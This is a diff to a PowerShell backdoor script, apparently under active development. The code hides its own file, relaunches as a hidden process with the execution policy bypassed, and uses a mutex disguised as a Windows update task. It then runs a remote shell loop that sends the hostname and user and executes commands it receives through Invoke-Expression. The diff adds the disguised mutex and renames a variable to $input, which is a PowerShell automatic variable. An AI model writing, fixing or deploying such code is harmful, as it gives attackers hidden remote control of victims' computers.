@@ -20,13 +20,14 @@ if ($PSCommandPath -ne $FullPath) {
             attrib +h +s $FullPath
         } catch { return }
     }
-
     # Start background process and terminate loader
     Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
     Stop-Process -Id $PID
 }
 
 # 2. SINGLE INSTANCE CHECK
+$MutexName = "Global\WinUpdateMaintenance_Mutex"
+$Mutex = New-Object System.Threading.Mutex($false, $MutexName, [ref]$CreatedNew)
 if (-not $CreatedNew) { exit }
 
 # 3. SYSTEM PREP (Admin Required)
@@ -58,23 +59,20 @@ while ($true) {
         $reader = New-Object System.IO.StreamReader($stream)
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
-
         $writer.WriteLine("--- Connection Established: $(hostname) [$(whoami)] ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
-            $imput = $reader.ReadLine()
-            if ($null -eq $imput -or $imput -eq "exit") { break }
-            if ([string]::IsNullOrWhiteSpace($imput)) { continue }
-
-            if ($imput.ToLower().StartsWith("cd ")) {
-                $newPath = $imput.Substring(3).Trim().Replace('"','')
+            $input = $reader.ReadLine()  # Fixed typo here
+            if ($null -eq $input -or $input -eq "exit") { break }
+            if ([string]::IsNullOrWhiteSpace($input)) { continue }
+            if ($input.ToLower().StartsWith("cd ")) {
+                $newPath = $input.Substring(3).Trim().Replace('"','')
                 try { Set-Location $newPath } catch { $writer.WriteLine($_.Exception.Message) }
                 continue
             }
-
             $output = try {
-                Invoke-Expression $imput 2>&1 | Out-String
+                Invoke-Expression $input 2>&1 | Out-String
             } catch {
                 $_.Exception.Message
             }
